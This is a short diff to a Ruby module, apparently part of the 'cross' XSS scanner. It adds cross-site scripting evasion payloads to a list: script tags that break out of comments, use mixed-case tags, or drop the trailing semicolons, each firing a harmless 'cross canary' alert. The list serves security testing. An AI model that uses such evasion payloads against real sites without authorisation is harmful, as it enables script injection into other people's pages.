@@ -5,10 +5,15 @@ module Cross
       def self.each
 
         evasions = [
+          "<script>alert('cross canary')</script>",
           "<script>alert('cross canary');</script>",
+          "/--><script>alert('cross canary')</script>",
           "/--><script>alert('cross canary');</script>",
+          "/--></ScRiPt><ScRiPt>alert('cross canary')</ScRiPt>",
           "/--></ScRiPt><ScRiPt>alert('cross canary');</ScRiPt>",
+          "//;-->alert('cross canary')",
           "//;-->alert('cross canary');",
+          "\"//;\nalert('cross canary')",
           "\"//;\nalert('cross canary');",
           # more exotic vectors (antisnatchor's collection)
           "<script/anyjunk>alert('cross canary')</script>",
